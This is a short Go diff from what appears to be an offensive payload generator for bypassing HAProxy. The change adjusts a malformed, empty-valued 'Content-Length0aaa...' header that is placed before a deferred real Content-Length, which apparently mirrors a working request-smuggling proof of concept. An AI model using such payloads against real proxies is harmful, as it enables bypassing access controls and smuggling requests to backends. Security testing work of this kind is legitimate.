@@ -71,8 +71,8 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			Headers: []Headers{
 				// 1. Malformed header FIRST - NO VALUE after colon (like working PoC)
 				{
-					Header: malformedHeaderName + ":", // e.g., "Content-Length0aaa...:"
-					Value:  "",                        // EMPTY VALUE - this is critical!
+					Header: malformedHeaderName, // e.g., "Content-Length0aaa..." (no colon, request.go adds it)
+					Value:  "",                  // EMPTY VALUE - this is critical!
 				},
 				// 2. Real Content-Length will be deferred to LAST position in request.go
 				{
